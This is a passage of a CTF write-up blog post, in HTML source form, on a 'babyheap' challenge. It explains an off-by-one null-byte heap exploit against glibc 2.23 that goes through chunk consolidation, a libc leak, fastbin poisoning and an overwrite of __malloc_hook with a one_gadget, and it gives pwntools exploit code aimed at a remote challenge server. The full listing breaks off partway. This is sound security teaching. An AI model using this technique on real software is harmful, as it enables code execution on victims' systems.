+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>) <span style="color:#f92672">^</span> v5;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><hr>
+<h2 id="identifying-the-vulnerabilities">Identifying the vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#identifying-the-vulnerabilities">#</a></h2>
+<p>The <em>id</em>s of the chunks are stored at <code>&amp;unk_202040</code>.</p>
+<p>Here, we have a 1 byte overflow of our data; Except it&rsquo;s a null byte.</p>
+<p>So by doing <code>malloc(a)</code>, <code>malloc(b)</code>, <code>free(a)</code> and <code>malloc(a)</code> again, except overflow this time,
+we can modify the size of chunk <code>b</code>&rsquo;s first byte.</p>
+<p>I found this <a href="https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/off_by_one/">resource</a>, saying:</p>
+<blockquote>
+<p>The overflow byte is NULL. When the size is <code>0x100</code>, overflowing the NULL byte makes the <code>prev_in_use</code> bit clear, so the previous block is considered a free block. (1) At this point you can choose to use the unlink method (see the unlink section) for processing.</p>
+<p>In addition, when the <code>prev_size</code> field is enabled, you can forge <code>prev_size</code>, causing overlap between blocks. The key to this method is that unlink does not check whether the last block of the block found by prev_size (theoretically the block currently unlinked) is equal to the block size currently being unlinked.</p></blockquote>
+<p>Interesting, so that&rsquo;s what we&rsquo;re dealing with. I looked and found another great <a href="https://devel0pment.de/?p=688">resource</a>, which solved what could be our exact challenge except with different names for the functions. I definitely recommend reading it; there&rsquo;s a lot of in-depth information about everything that&rsquo;s happening.</p>
+<h3 id="the-leak">The leak<a hidden class="anchor" aria-hidden="true" href="#the-leak">#</a></h3>
+<p>What we need is a <code>libc</code> leak, and a <code>hook</code> overwrite.</p>
+<p>But let&rsquo;s take things step by step.</p>
+<p>All we can do now, is make it so the next address&rsquo; <code>prev_inuse</code> flag will be null. That way, when we free it, we can have it trigger a consolidation with one of the previous chunks.</p>
+<p>In order to do that, there&rsquo;s a couple of things we need to take into consideration.</p>
+<p>A chunk&rsquo;s structure looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> malloc_chunk {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  INTERNAL_SIZE_T      prev_size;  <span style="color:#75715e">/* Size of previous chunk (if free).  */</span>
+</span></span><span style="display:flex;"><span>  INTERNAL_SIZE_T      size;       <span style="color:#75715e">/* Size in bytes, including overhead. */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> malloc_chunk<span style="color:#f92672">*</span> fd;         <span style="color:#75715e">/* double links -- used only if free. */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> malloc_chunk<span style="color:#f92672">*</span> bk;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Only used for large blocks: pointer to next larger size.  */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> malloc_chunk<span style="color:#f92672">*</span> fd_nextsize; <span style="color:#75715e">/* double links -- used only if free. */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> malloc_chunk<span style="color:#f92672">*</span> bk_nextsize;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>So in order to consolidate a chunk with a previous one, we must also fake a <code>prev_size</code>, and have the previous chunk present valid <code>fd</code>/<code>bk</code> pointers.</p>
+<p>We can absolutely get around this - we can create a REAL freed chunk (A), for the valid <code>fd</code>/<code>bk</code>, before a <em>buffer</em> chunk (B).</p>
+<p>Then, we&rsquo;re going to tell the null byte poisoned chunk (C) to treat the real freed chunk (A) and the buffer chunk (B) as one continuous chunk, by specifying the <code>prev_size</code> of both of them combined.</p>
+<p>So when we free the poisoned chunk (C), it will attempt to create one huge chunk, all the way from the from A to C. To prevent it from consolidating with the wilderness, we will also add another smaller fastbin-size chunk after chunk C, which I&rsquo;ll call D.</p>
+<p>But the thing is, chunk B hasn&rsquo;t been freed yet; So we can still print the information from there.</p>
+<p>But right now, it shouldn&rsquo;t have any <code>fd</code> or <code>bk</code> pointers inside. Those are in the beginning of the huge continuous chunk.</p>
+<p>To do that, we can malloc, and that will eat from continuous chunk&rsquo;s size; that will leave in the remaining free chunk the <code>fd</code> and <code>bk</code>. If we get the right size in the malloc, the free chunk pointers will overlap chunk B&rsquo;s data perfectly.</p>
+<p>And now, since we overwrote chunk B&rsquo;s metadata, we&rsquo;re going to have to restore it (the size field) in order to fit it into fastbins, so back to 0x70. More on why in the second part.</p>
+<p>If I lost you, there are visual representations of this in the link I added above, so check it out.</p>
+<p>This is the first part of the exploit; so let&rsquo;s get started.</p>
+<hr>
+<p>First, I created all the chunks, freed A, and overwrote chunk C&rsquo;s <code>prev_inuse</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#chunk A</span>
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;248&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">247</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#chunk B</span>
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;104&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">103</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#chunk C</span>
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;248&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;C&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">247</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#chunk D</span>
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;24&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;D&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">23</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#free chunk A</span>
+</span></span><span style="display:flex;"><span>free(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#turn chunk C&#39;s prev_inuse to 0 </span>
+</span></span><span style="display:flex;"><span>free(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;104&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;C&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">104</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#after doing this, the index of chunk B will be 0</span>
+</span></span></code></pre></div><p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/babyheap-writeup/1.png#center"></p>
+<p>Now, we need to create a fake <code>prev_size</code>. The data is moved through <code>strcpy</code>, which breaks on null bytes, though. So we&rsquo;re going to have to use the fact that the last byte of data of each <code>malloc</code> at position B will be turned into a null byte.</p>
+<p>So we keep malloc-ing and freeing smaller and smaller chunks, until we reach our desired offset.</p>
+<p>And keep in mind, now the index of chunk B will be 0, since we freed A, then B, then malloc-ed again; The slot in 0 is open again, and that&rsquo;s where B is going to be put.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#create fake prev_size for chunk C</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#first the null bytes</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">7</span>):
+</span></span><span style="display:flex;"><span>    free(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>    malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;104&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">104</span><span style="color:#f92672">-</span>i))
+</span></span></code></pre></div><p>Since the desired <code>prev_size</code> is of A&rsquo;s <code>size</code> + B&rsquo;s <code>size</code>, that&rsquo;s going to be <code>0x170</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>free(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;104&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">104</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x70\x01</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/babyheap-writeup/2.png#center"></p>
+<p>I realised that the libc version I was using for this was way too recent and invulnerable to this sort of stuff, so I switched to an older version for the sake of this challenge. (something in glibc 2.23).</p>
+<p>Now, let&rsquo;s trigger the consolidation, by freeing chunk C.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/babyheap-writeup/3.png#center"></p>
+<p>Nice! All went well! Next step, we malloc something to push the <code>fd</code> and <code>bk</code> into B&rsquo;s data.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#75715e">#trigger consolidation of chunk C with previous chunk!</span>
+</span></span><span style="display:flex;"><span>free(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;248&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">247</span>)
+</span></span></code></pre></div><p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/babyheap-writeup/4.png#center"></p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/babyheap-writeup/5.png#center"></p>
+<p>The offset locally for me was <code>0x3c4b78</code>, hopefully we guessed the libc version correctly and we don&rsquo;t have to change this.</p>
+<h3 id="the-overwrite">The overwrite<a hidden class="anchor" aria-hidden="true" href="#the-overwrite">#</a></h3>
+<p>Now, the hard part is over. What we want to do now is overwrite a hook, like <code>__malloc_hook</code> with a one_gadget/system.</p>
+<p>We can abuse the fastbins for this; If we send free chunk B of size 0x70, it will end up in the fastbin, and it will receive a <code>fd</code> address. When we free chunk B, the next head of the fastbins will be what&rsquo;s stored in <code>fd</code>.</p>
+<p>If we overwrite <code>fd</code>, we control the address of the next element of the fastbin.</p>
+<p>Then, the next time we malloc something of a simliar size, it will attempt to place it in the current head of the fastbin. Which is our controlled address.</p>
+<p>The reason I&rsquo;m referring to it as a controlled address is because we control the chunk before it, chunk A (or what&rsquo;s become of it). That way, we can finally pop a shell.</p>
+<hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#now, let&#39;s restore the size of chunk B so it fits back into fastbins</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#the chunk A is now stored at index 1</span>
+</span></span><span style="display:flex;"><span>free(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;E&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">250</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>free(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;E&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">248</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x70</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>Now, we free both chunk B and chunk E (that&rsquo;s what I&rsquo;m going to call chunk A now), and overwrite the <code>fd</code> of B with the first valid chunk metadata before <code>__malloc_hook</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>free(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>free(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#malloc chunk E to overwrite the fd of chunk B. we want that to be find-fake-fast __malloc_hook.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>malloc_hook_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3c4b10</span>
+</span></span><span style="display:flex;"><span>fake_hook_chunk <span style="color:#f92672">=</span> libc <span style="color:#f92672">+</span> malloc_hook_offset <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x23</span>
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;264&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">256</span> <span style="color:#f92672">+</span> p64(fake_hook_chunk))
+</span></span></code></pre></div><p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/babyheap-writeup/6.png#center"></p>
+<p>Now, let&rsquo;s restore the integrity of poor chunk B again. We&rsquo;re freeing E and malloc-ing it again to restore the size and flags of chunk B.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#restore chunk B&#39;s metadata through chunk E</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">7</span>):
+</span></span><span style="display:flex;"><span>    free(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>    malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;256&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;E&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">256</span><span style="color:#f92672">-</span>i))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>free(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;E&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">248</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x70</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>Let&rsquo;s do the two mallocs as well, and see what happens:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#chunk B</span>
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;104&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">103</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#malloc_hook</span>
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;104&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">103</span>)
+</span></span></code></pre></div><p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/babyheap-writeup/7.png#center"></p>
+<p>Great - now we just need to overwrite it with a proper <code>one_gadget</code>!</p>
+<p>And you won&rsquo;t believe what happened now. Maybe you remember I said I downloaded some random glibc 2.23 for testing. Well, I tried to get its one_gadgets, and none worked. So I scrolled through the source, to see what gadgets they used. I thought to myself, I surely downloaded the wrong libc, because there&rsquo;s no other way to solve this.</p>
+<p>And, the third gadget from their list worked!! I tested them remotely right away, so I got the flag! I was very surprised to see it.</p>
+<p>Anyways, I rewrote the last part like so:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>one_gadget <span style="color:#f92672">=</span> libc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xf02a4</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#malloc_hook</span>
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;104&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">19</span>) <span style="color:#f92672">+</span> p64(one_gadget) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">65</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#gdb.attach(p, gdbscript = &#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#b * &amp;__malloc_hook</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#c</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#&#39;&#39;&#39;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#one last malloc</span>
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;24&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;F&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">23</span>)
+</span></span></code></pre></div><p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/babyheap-writeup/flag.png#center"></p>
+<h2 id="the-full-exploit">The full exploit<a hidden class="anchor" aria-hidden="true" href="#the-full-exploit">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./pwn&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>cyberedu <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;34.159.85.111:31989&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ip, port <span style="color:#f92672">=</span> cyberedu<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> int(port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(ip, port)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>process()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(size, data):
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#select</span>
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#size</span>
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(size)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#data</span>
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(data)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(data_id):
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#select</span>
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)    
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#select ID</span>
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(data_id)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show</span>(data_id):
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#select</span>
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)  
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#select ID</span>
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(data_id)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#when it loops , it only checks if the 8 bytes at that address are null...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#0x100-8 turns to 0x101 chunk; 248</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#0x68 turns to 0x71 chunk; 104</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#0x18 turns to 0x21 chunk; 24</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#chunk A</span>
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;248&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">246</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#chunk B</span>
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;104&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">103</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#chunk C</span>
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;248&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;C&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">247</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#chunk D</span>
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;24&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;D&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">23</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#free chunk A</span>
+</span></span><span style="display:flex;"><span>free(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#turn chunk C&#39;s prev_inuse to 0 </span>
+</span></span><span style="display:flex;"><span>free(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;104&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">104</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#after doing this, the index of chunk B will be 0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#create fake prev_size for chunk C</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#first the null bytes</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">7</span>):
+</span></span><span style="display:flex;"><span>    free(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>    malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;104&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">104</span><span style="color:#f92672">-</span>i))
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>free(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;104&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">104</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x70\x01</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#trigger consolidation of chunk C with previous chunk!</span>
+</span></span><span style="display:flex;"><span>free(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
